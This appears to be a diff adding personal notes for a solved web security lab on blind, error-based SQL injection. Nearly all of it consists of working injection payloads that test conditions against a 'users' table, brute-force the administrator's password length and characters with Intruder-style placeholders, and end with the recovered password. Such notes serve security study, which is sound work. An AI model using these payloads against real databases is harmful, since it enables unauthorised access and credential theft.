@@ -1,0 +1,17 @@
+test: 
+' and case when 1=1 then 1/0 end; => returned 500 error
+' AND (SELECT NULL FROM users WHERE username='administrator') IS NULL--
+
+' AND (select case when ('a'<'h') then 'a' else to_char(1/0) end from users where username='administrator')='a
+
+'+AND+(SELECT+case+when+'a'='a'+then+NULL+end+FROM+users+WHERE+username='administrator')+IS+NULL--
+
+' AND (SELECT case when 'a'='b' then 1/0 else NULL end FROM users WHERE username='administrator') IS NULL--
+
+' AND (SELECT case when (length(password) < §a§) then 1/0 else null end from users where username='administrator') is null--
+==> 500 ERROR at 21 length => password length: 20
+
+SOLUTION:
+' AND (SELECT case when (substr(password,1,1)='§a§') then 1/0 else NULL end FROM users WHERE username='administrator') IS NULL--
+
+password: 9oobz2uonxaoegocw53t
